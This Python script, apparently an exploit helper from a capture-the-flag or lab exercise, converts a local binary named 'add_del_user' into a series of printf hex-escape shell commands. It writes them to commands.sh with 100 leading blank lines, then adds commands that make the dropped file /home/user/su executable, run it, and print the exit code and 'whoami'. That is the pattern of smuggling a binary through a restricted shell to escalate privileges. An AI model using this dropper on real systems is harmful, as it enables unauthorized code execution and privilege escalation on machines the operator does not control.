def upload_file(src_path, dst_path):
    with open(src_path, 'rb') as f:
        file_bin = f.read()
    
    file_bin_split = [file_bin[i:i+32] for i in range(0, len(file_bin), 32)]
    file_str_split = [ [r'\x' + hex(int(byte))[2:].zfill(2) for byte in file_bin_split[i]] for i in range(len(file_bin_split)) ]
    file_strs = [''.join(file_str) for file_str in file_str_split]

    return_str = ''
    return_str += 'printf "{}" > {}\n'.format(file_strs[0], dst_path)
    for file_str in file_strs[1:]:
        return_str += 'printf "{}" >> {}\n'.format(file_str, dst_path)
    
    return return_str


# Run commands by writing to file
with open(r'commands.sh', 'w') as f:
    f.write('\n' * 100)
    f.write('\n'.join([

        upload_file('add_del_user', '/home/user/su'),
        'chmod u+x /home/user/su',
        '/home/user/su',
        'echo $?',
        'whoami',
    ]) + '\n')